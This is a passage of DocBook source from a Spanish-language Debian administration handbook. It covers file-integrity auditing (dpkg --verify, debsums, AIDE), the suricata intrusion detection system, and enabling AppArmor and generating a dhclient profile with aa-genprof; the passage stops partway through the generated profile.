	<para>Existen muchas herramientas dedicadas para esta tarea. La mayoría puede obtener datos a través de SNMP (<emphasis>protocolo simple de gestión de red</emphasis>: «Simple Network Management Protocol») para centralizar esta información. Un beneficio adicional es que permite recoger datos de elementos de red que pueden no ser equipos de propósito general, tal como switches o routers dedicados.</para>

	<para>Este libro habla de Munin con cierto detalle (ver la <xref linkend="sect.munin" /> como parte del <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />. Debian también proporciona una herramienta similar: <emphasis role="pkg">cacti</emphasis>. Su despliegue es algo más complejo puesto que se basa exclusivamente en SNMP. A pesar de que dispone de una interfaz web, entender los conceptos involucrados en la configuración requiere de todas formas un poco de esfuerzo. Debería considerar como prerequisito leer la documentación HTML (<filename>/usr/share/doc/cacti/html/index.html</filename>).</para>

        <sidebar>
          <title><emphasis>ALTERNATIVA</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para><command>mrtg</command> (contenido en el paquete del mismo nombre) es una herramienta más antigua. A pesar de algunas asperezas, puede agrupar datos históricos y mostrarlos como gráficos. Incluye algunos scripts para recolectar los datos monitorizados con más frecuencia como la carga de procesador, el tráfico de red, el número de impresiones de una página web, etc.</para>

	  <para>Los paquetes <emphasis role="pkg">mrtg-contrib</emphasis> y <emphasis role="pkg">mrtgutils</emphasis> contienen scripts de ejemplo que puede utilizar directamente.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>Detección de cambios</title>

      <para>Una vez que el sistema está instalado y configurado, dejando al margen las actualizaciones de seguridad, normalmente no hay razón para que los archivos y directorios cambien con excepción de los datos. Por lo tanto, es interesante asegurarse que efectivamente los archivos no cambian: debería investigar cualquier cambio inesperado. Esta sección presenta algunas herramientas capaces de monitorizar archivos y advertir al administrador en caso de que se produzca algún cambio inesperado (o simplemente enumerar estos cambios).</para>
      <section id="sect.dpkg-verify">
        <title>Auditoría de paquetes mediante <command>dpkg --verify</command></title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>YENDO MÁS ALLÁ</emphasis> Protección contra los cambios de los desarrolladores originales</title>

	  <para><command>dpkg --verify</command> es útil para detectar cambios en los archivos que provienen de un paquete de Debian, pero es inútil si el propio paquete ha sido comprometido, por ejemplo si se comprometió la réplica Debian. Protegerse de este tipo de ataques implica utilizar del sistema de verificación de firma digital de APT (revise la <xref linkend="sect.package-authentication" />) y sólo instalar paquetes de un origen certificado.</para>
        </sidebar>

        <para><command>dpkg --verify</command> (o <command>dpkg -V</command>) es una orden interesante, puesto que permite averiguar qué archivos han sido modificados (potencialmente por un atacante). Sin embargo esta información se tiene que tomar con precaución. Para hacer su trabajo, dpkg utiliza las sumas de verificación (checksums) almacenadas en el disco duro (se pueden encontrar en  <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>); un atacante minucioso podría actualizar estos archivos de forma que contengan las nuevas sumas de verificación de los archivos modificados.</para>

        <sidebar>
          <title><emphasis>VOLVER A LOS CIMIENTOS</emphasis> Huella digital de un archivo</title>
	  <indexterm><primary>huella digital</primary></indexterm>
	  <indexterm><primary>suma de verificación</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>Como recordatorio: una huella digital es un valor, a menudo un número (aunque pueda estar en notación hexadecimal), que contiene una especie de firma de los contenidos de un archivo. Se calcula esta firma mediante un algoritmo (MD5 o SHA1 son ejemplos muy conocidos) que más o menos garantizan que incluso el cambio más pequeño en el contenido de un archivo implica un cambio en su huella digital; esto es conocido como «efecto avalancha». Esto permite que una simple huella digital numérica sirva como patrón para comprobar si se alteró el contenido de un archivo. Estos algoritmos no son reversibles; en otras palabra, para la mayoría de ellos, conocer la huella digital no permite averiguar los contenidos correspondientes. Los avances matemáticos recientes parece que debilitan la verdad absoluta de estos principios, pero por el momento su uso no se ha puesto en cuestón, ya que crear distintos contenidos que produzcan la misma huella todavía parece una tarea muy complicada.</para>
        </sidebar>

        <para>Le comando <command>dpkg -V</command> comprueba todos los paquetes instalados e imprime una línea por cada archivo en el que falle el test de integridad. El formato de salida es el mismo que el del comando <command>rpm -V</command>, conde cada carácter corresponde a una comprobación sobre un metadato específico. Desgraciadamente <command>dpkg</command> no almacena todos los metadatos requeridos para todas las comprobaciones, y por lo tanto imprimirá signos de interrogación para la mayor parte de los mismos. En la actualidad únicamente el test de suma de verificación podría impirmir un « 5 » (en la tercera columna) en caso de no pasar la comprobación.</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
        <para>En el ejemplo anterior, dpkg muestra un cambio realizado por el administrador en el archivo de servicio de SSH contenido en el paquete, en lugar de modificar la configuración mediante un archivo <filename>/etc/systemd/system/ssh.service</filename> (almacenado en <filename>/etc</filename> como deberían estar todos los archivos de configuración). dpkg también muestra varios archivos de confirugación (identificados con la letra « c » en el segundo campo) que han sido modificados (de forma legítima).</para>
      </section>

      <section id="sect.debsums">
        <title>Auditoría de paquetes: <command>debsums</command> y sus límites</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para><command>debsums</command> es el antecesor de <command>dpkg -V</command> y por lo tanto está prácticamente obsoleto. Tiene las mismas restricciones que dpkg. Afortunadamente, algunas de sus limitaciones pueden ser obviadas (lo que no es posible con dpkg).</para>

        <para>Como no es posible confiar en los archivos almacenadados en el disco, <command>debsums</command> permite efectuar sus comprobaciones a partir de los archivos <filename>.deb</filename> además de a partir de la base de datos de dpkg. Para descargar los archivos <filename>.deb</filename> confiables de todos los paquetes instalados, se pueden utilizar las descargas autenticadas de APT. Lo malo es que esta operación puede ser lenta y tediosa y, por lo tanto, no debe considerarse como una técnica proactiva a utilizar de forma regular.</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>

	<para>Sepa que este ejemplo utiliza el programa <command>grep-status</command> del paquete <emphasis role="pkg">dctrl-tools</emphasis> que no se instala de forma predeterminada.</para>
      </section>
      <section>
        <title>Monitorización de archivos: AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (paquete Debian)</primary></indexterm>

	<para>La herramienta AIDE (<emphasis>entorno avanzado de detección de intrusión</emphasis>: «Advanced Intrusion Detection Environment») permite comprobar la integridad de los archivos y detectar cualquier cambio frente a una imagen guardada previamente del sistema válido. Se almacena esta imagen como una base de datos (<filename>/var/lib/aide/aide.db</filename>) que contiene la información relevante de todos los archivos del sistema (huella digital, permisos, marcas temporales, etc.). Se inicializa esta base de datos con <command>aideinit</command>; luego se la utiliza diariamente (por el script <filename>/etc/cron.daily/aide</filename>) para comprobar que nada importante haya cambiado. Cuando se detectan cambios, AIDE los almacena en archivos de registro (<filename>/var/log/aide/*.log</filename>) y envía lo encontrado en un email al administrador.</para>

        <sidebar>
          <title><emphasis>EN LA PRÁCTICA</emphasis> Protección de la base de datos</title>

	  <para>Debido a que AIDE utiliza una base de datos local para comparar el estado de los archivos, la validez de sus resultados está asociada directamente a la validez de la base de datos. Si un atacante consigue obtener permisos de administrador en un sistema comprometido, podrá reemplazar la base de datos y cubrir sus huellas. Una posible solución podría ser almacenar la base de datos de referencia en un medio de almacenamiento de sólo lectura.</para>
        </sidebar>

	<para>Puede utilizar numerosas opciones en el archivo <filename>/etc/default/aide</filename> para configurar el comportamiento del paquete <emphasis role="pkg">aide</emphasis>. Se almacena la configuración de AIDE en sí en <filename>/etc/aide/aide.conf</filename> y <filename>/etc/aide/aide.conf.d/</filename> (de hecho, sólo <command>update-aide.conf</command> utiliza estos archivos para generar <filename>/var/lib/aide/aide.conf.autogenerated</filename>). La configuración indica qué propiedades se deben comprobar. Por ejemplo, el contenidos de los archivos de registro cambia continuamente, y se puede ignorar estos cambios mientras que los permisos de los archivos permanezcan inalterados, pero tanto el contenido como los permisos de los programas ejecutables debe permanecer constante. Aunque no es excesivamente compleja, la sintaxis de la configuración no es del todo intuitiva y, por lo tanto, recomendamos leer su página de manual <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry>.</para>

	<para>Cada día se genera una nueva versión de la base de datos en <filename>/var/lib/aide/aide.db.new</filename>; si todos los cambios registrados son legítimos, puede utilizarla para reemplazar la base de datos de referencia.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVA</emphasis> Tripwire y Samhain</title>

	  <para>Tripwire es muy similar a AIDE; incluso la sintaxis del archivo de configuración es prácticamente la misma. La ventaja principal de <emphasis role="pkg">tripwire</emphasis> es un mecanismo para firmar el archivo de configuración, de forma que un atacante no pueda hacer que apunte a una versión diferente de la base de datos de referencia.</para>

	  <para>Samhain también ofrece características similares, así como algunas funciones para ayudar a detectar «rootkits» (revise el recuadro  <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). También puede desplegarlo de forma global en una red y guardar sus trazas en un servidor central (con su firma correspondiente).</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>VISTA RÁPIDO</emphasis> Los paquetes <emphasis role="pkg">checksecurity</emphasis> y <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para>El primero de estos paquetes contiene varios scripts pequeños que realizan comprobaciones básicas en el sistema (contraseñas vacías, nuevos archivos setuid, etc.) y advierten al administrador si fuese necesario. A pesar de su nombre explícito, un administrador no debería confiar exclusivamente en él para asegurarse que un sistema Linux es seguro.</para>

	  <para>Los paquetes <emphasis role="pkg">chkrootkit</emphasis> y <emphasis role="pkg">rkhunter</emphasis> permiten buscar posibles «<emphasis>rootkits</emphasis>» instalados en el sistema. Como recordatorio, estos son programas designados para ocultar que se ha comprometido el sistema a la vez que se mantiene el control de la máquina. Las comprobaciones no son 100% confiables, pero generalmente pueden guiar la atención del administrador a problemas potenciales.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>Detección de intrusiones (IDS/NIDS)</title>
      <indexterm><primary>detección, intrusión</primary></indexterm>
      <indexterm><primary>detección de intrusiones</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>sistema de detección de intrusiones</primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>red</primary><secondary>IDS</secondary></indexterm>

      <sidebar>
        <title><emphasis>VOLVER A LOS CIMIENTOS</emphasis> Denegación de servicio</title>
        <indexterm><primary>denegación de servicio</primary></indexterm>

	<para>Un ataque de «denegación de servicio» tiene una única finalidad: hacer que un servicio no esté disponible. El resultado es el mismo independientemente de si el ataque implica sobrecargar al servidor mediante consultas o si se aprovecha algún fallo: el servicio deja de estar operativo. Los usuarios habituales no estarán contentos y la entidad que alberga la red a la que se dirige el ataque sufre una pérdida de reputación (y posiblemente también de ingresos, por ejemplo si el servicio es un sitio de comercio electrónico).</para>

	<para>Algunas veces estos ataques son «distribuidos»; esto implica habitualmente sobrecargar al servidor con una gran cantidad de consultas provenientes de diferentes fuentes para que el servidor no sea capaz de atender las consultas legítimas. Este tipo de ataques se han hecho merecedores de dos acrónimos muy conocidos: <acronym>DoS</acronym> (denegación de servicio: «Denial of Service») y <acronym>DDoS</acronym> (denegación de servicio distribuido: «Distributed Denial of Service») según si el ataque es distribuido o no.</para>
      </sidebar>

      <para><command>suricata</command> (del paquete Debian con el mismo nombre) es un NIDS — un <emphasis>sistema de detección de intrusiones de red</emphasis> («Network Intrusion Detection System»). Su función es escuchar la red y tratar de detectar intentos de infiltración y/o actos hostiles (incluídos ataques de denegación de servicio). Todos estos eventos son registrados en varios archivos dentro de <filename>/var/log/suricata</filename>.  Existen utilidades de terceros (Kibana/logstash) para poder examinar todos los datos recogidos.  <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>PRECAUCIÓN</emphasis> Rango de acción</title>

	<para>La efectividad de <command>suricata</command> está limitada por el tráfico que ve en la interfaz de red monitorizada. Obviamente no podrá detectar nada si no puede observar el tráfico real. Cuando se encuentra conectado a un switch de red sólo monitorizará los ataques que tengan como objetivo a la máquina en la que está ejecutándose, lo que probablemente no sea la intención. Por lo tanto, la máquina que ejecute <command>suricata</command> debería conectarse a un puerto «espejo» del switch, que habitualmente se utiliza para encadenar switches y, por lo tanto, obtiene todo el tráfico.</para>
      </sidebar>

      <para>La configuración de Suricata se realiza a travśe del archivo <filename>/etc/suricata/suricata-debian.yaml</filename>, que es muy extenso, puesto que cada parámetro está descrito ampliamente. Como mínimo se requireconfigurar el rango de direcciones de la red local (el parámetro <literal>HOME_NET</literal>). En la práctica esto quiere decir el conjunto de todos los blancos de ataque potenciales. Pero para sacar el mayor partido a esta utilidad, se debería leer todo el archivo y adaptarlo de la mejor manera a la situación local.</para>
      <para>Igualmente, se debería configurar <filename>/etc/default/suricata</filename> para establecer qué interfaz de red supervisar y para activar el script de inicialización (estableciendo <literal>RUN=yes</literal>). Además se puede establecer <literal>LISTENMODE=pcap</literal>, porque el valor predeterminado (<literal>nfqueue</literal>) no funciona sin una configuración adicional (el cortafuegos netfilter debe configurarse mediante el destino <literal>NFQUEUE</literal> para pasar los paquetes a un archivo de cola en espacio de usuario gestionado por suricata).</para>
      <para><command>suricata</command> detecta comportamientos anómalos basándose en un conjunto de reglas de supervisión. Un conjunto de estas reglas está disponible en el paquete <emphasis role="pkg">snort-rules-default</emphasis>. <command>snort</command> es la referencia dentro del ecosistema de IDSs, y <command>suricata</command> puede reutilizar las reglas escritas para este programa. Desgraciadamente este paquete no está disponible para <emphasis role="distribution">Debian Jessie</emphasis>, y se pude obtener de otra versión de Debian, como la versión de pruebas (<emphasis role="distribution">Testing</emphasis>) o la inestable (<emphasis role="distribution">Unstable</emphasis>)".</para>
      <para>Otra posibilidad es utilizar <command>oinkmaster</command> (en el paquete homónimo), que es capaz de descargar conjuntos de relgas de Snort desde fuentes externas.</para>
      <sidebar>
        <title><emphasis>YENDO MÁS ALLÁ</emphasis> Integración con <command>prelude</command></title>

	<para>Prelude permite la monitorización centralizada de la información de seguridad. Su arquitectura modular incluye un servidor (el <emphasis>gestor</emphasis>, en el paquete <emphasis role="pkg">prelude-manager</emphasis>), que recoge las alertas generadas por los <emphasis>sensores</emphasis> de diferentes tipos.</para>

	<para>Puede configurar Suricata como uno de estos sensores. Otra posibilidad es <emphasis>prelude-lml</emphasis> (<emphasis>lacayo de monitorización de registros</emphasis>: «Log Monitor Lackey»), que monitoriza los archivos de registro (de forma similar a como lo hace <command>logcheck</command>, descripto en la <xref linkend="sect.logcheck" />).</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>Introducción a AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>Principios</title>
      <para>Apparmor es un sistema de <emphasis>control obligatorio de acceso</emphasis> («Mandatory Access Control» o «MAC») basado en la interfaz LSM  (<emphasis>módulos de seguridad de Linux</emphasis>: «Linux Security Modules»). En la práctica, el núcleo pregunta a AppArmor antes de cada llamada al sistema del sistema para saber si un proceso está autorizado a realizar dicha operación. A través de este mecanismo, Apparmor confina un programa a un conjunto limitado de recursos.</para>
      <indexterm><primary><emphasis>Control de Acceso Obligatorio: Mandatory Access Control</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Módulos de Seguridad de Linux: Linux Security Modules</emphasis></primary></indexterm>
      <para>AppArmor aplica un conjunto de reglas (un «perfil») a cada programa. El perfil aplicado por el núcleo depende de la ruta de instalación del programa a ejecutar. Al contrario que en SELinux (descrito en <xref linkend="sect.selinux" />), las reglas que se aplican no dependen del usuario: a todos los usuarios se les aplica el mismo juego de reglas cuando ejecutan el mismo programa (aunque en cualquer caso siguen teniéndose en cuenta los permisos de usuario tradicionales, lo que puede resultar en un comportamiento distinto).</para>
      <para>Los perfiles de AppArmor se guardan en <filename>/etc/apparmor.d/</filename> y contienen una lista de reglas de control de acceso sobre los recursos que puede utilizar cada programa. Los perfiles se compilan y son cargados por el núcleo por la orden <command>apparmor_parser</command>. Cada perfil se puede cargar bien en modo estrícto (<foreignphrase>enforcing</foreignphrase>) o bien en modo relajado (<foreignphrase>complaining</foreignphrase>). El modo estricto aplica las reglas y registra las tentativas de violación, mientras que en el modo relajado sólo se registran las llamadas al sistema que hubieran sido bloqueadas, pero no se bloquean realmente.</para>
    </section>
    <section id="sect.apparmor-setup">
      <title>Activar AppArmour y gestionar los perfiles</title>
      <para>El soporte de AppArmor está ya integrado en los núcleos estándar proporcionados por Debian. Para activar AppArmor basta con instalar algunos paquetes adicionales y establecer algún parámetro en la línea de órdenes del núcleo:</para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>Después de un reinicio AppArmor estará operativo, lo cual se puede confirmar mediante <command>aa-status</command>:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
      <sidebar>
        <title><emphasis>NOTA</emphasis> Otros perfiles de AppArmor</title>
        <para>El paquete  <emphasis role="pkg">apparmor-profiles</emphasis> contiene pefiles desarrollados por la comunidad de origen de AppArmor. Para obtener más pefiles es posible instalar <emphasis role="pkg">apparmor-profiles-extra</emphasis>, que contiene perfiles adicionales desarrollados por Ubuntu y Debian.</para>
      </sidebar>
      <para>El estado de cada perfil se puede cambair entre los modos estricto y relajado mediante las órdenes <command>aa-enforce</command> y <command>aa-complain</command>, pasándoles como parámetro bien la ruta del ejecutable o la ruta del archivo de perfil. De igual manera se puede desactivar completamente un perfil mediante <command>aa-disable</command>, o establecerlo en el modo de auditoría (de forma que registre incluso las llamadas del sistema aceptadas) mediante <command>aa-audit</command>.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>Creación de un nuevo perfil</title>
      <para>A pesar de que crear un perfil AppArmor es bastante sencillo, la mayoría de los programas no disponen de uno. Esta sección muestra cómo crear un nuevo perfil desde cero, símplemente utilizando el programa deseado y dejando que AppArmor monitorice las llamadas al sistema que realiza y los recursos a los que accede.</para>
      <para>Los programas que deben ser confinados de forma prioritaria son aquellos expuestos a la red, puesto que estos serán los blancos más probables para atacantes remotos. Precisamente por eso AppArmor proporciona la orden <command>aa-unconfined</command>, que lista los programas que exponen al menos un zócalo de red (NT: ¿mejor puerto de red?) sin tener ningún perfil asociado. Con la opción <literal>--paranoid</literal> se obtienen todos los procesos que tienen activa al menos una conexión de red y no están confinados.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>El el ejemplo siguiente vamos a intentar crear un perfil para <command>/sbin/dhclient</command>. Para ello utilzamos la orden <command>aa-genprof dhclient</command>, que nos invita a utilizar la aplicación (en otra ventana) y a volver a <command>aa-genprof</command> una vez que hayamos terminado, para escrutar los registros en busca de eventos AppArmor y convertir estos registros en reglas de control de acceso. Para cada evento registrado se proponen una o varias sugerencias de reglas y será posible aprobarlas o modificarlas de distintas formas:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
      <para>Tenga en cuenta que el programa no muestra los caracteres de control que Vd. teclea; los hemos incluido en la transcripción anterior para aclarar las elecciones realizadas en cada paso.</para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>
            The first event detected is the execution of another program.
            In that case, you have multiple choices: you can run the program
            with the profile of the parent process (the “Inherit” choice),
            you can run it with its own dedicated profile (the
            “Profile” and the “Named” choices, differing only by the
            possibility to use an arbitrary profile name), you can run it
            with a sub-profile of the parent process (the “Child” choice),
            you can run it without any profile (the “Unconfined” choice)
            or you can decide to not run it at all (the “Deny” choice).
          </para>
          <para>Cuando se elije lanzar el proceso hijo con un perfil de dedicado que no exista aún, la herramienta creará el perfil que falta y propondrá sugerencias de reglas en la misma sesión de trabajo.</para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>A nivel del núcelo, los permisos especiales del usuario root se han separado en "capacidades" («capabilities»). Cuando una llamada del sistema requiere una capacidad específica, AppArmor verifica que el perfil permite al programa utilizar esta capacidad.</para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>Aquí el programa requiere el permiso de lectura sobre el archivo <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command> ha detectado que este permiso ya se había concedido por varias «abstracciones» y las ofrece como alternativas posibles. Una abstracción proporciona un conjunto reutilizable de reglas de control de acceso, agrupando reglas que duelen utilizarse conjuntamente. En este caso específico el archivo se utiliza normalmente por las funciones relativas a la resolución de nombres de la biblioteca estándar C, y por lo tanto elegimos la opcion «3» para incluir la opción «#include &lt;abstractions/nameservice&gt; » y después «A» para autorizarlo.</para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>El programa intenta crear el archivo <filename>/run/dhclient-eth0.pid</filename>. Si autorizamos únicamente la creación de este archivo, el programa no funcionará si el usuario intenta utilizarlo en otra interfaz de red. Por lo tanto habrá que selecionar «New» para reemplazar el nombre del archivo por un nombre más genérico,  « /run/dhclient*.pid », antes de guardar la regla con «Allow».</para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>Hay que tener en cuenta que este intento de acceso no forma parte del perfil dhclient, sino del nuevo perfil que hemos creado cuando hemos autorizado a <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> para que funcione bajo el suyo propio.</para>
          <para>Después de examinar todos los eventos registrados, el programa propone guardar todos los perfiles que se han creado durante la ejecución. En este caso tenemos dos perfiles que guardamos simultáneamente mediante «Save» antes de cerrar el programa con «Finish» (pero podríamos igualmente haberlos guardados individualmente).</para>
        </callout>
      </calloutlist>
      <para><command>aa-genprof</command> no es sino un pequeño script inteligente que utiliza <command>aa-logprof</command>: crea un perfil vacío, lo carga en modo relajado y después ejecuta <command>aa-logprof</command>. Esta última es una utilidad que actualiza un perfil en función de las violaciones que han sido registradas. Por lo tanto se puede volver a ejecutar esta herramienta para mejorar el perfil que se ha creado.</para>
      <para>Si se quiere que el perfil generado sea completo, se debería utilizar el programa de todas las formas legítimas posibles. En el caso de dhcliente esto significa ejecutarlo a través de Network Manager, pero también mediante ifupdown, a mano, etc. Finalmente se obtendrá un <filename>/etc/apparmor.d/sbin.dhclient</filename> parecido al siguiente:</para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
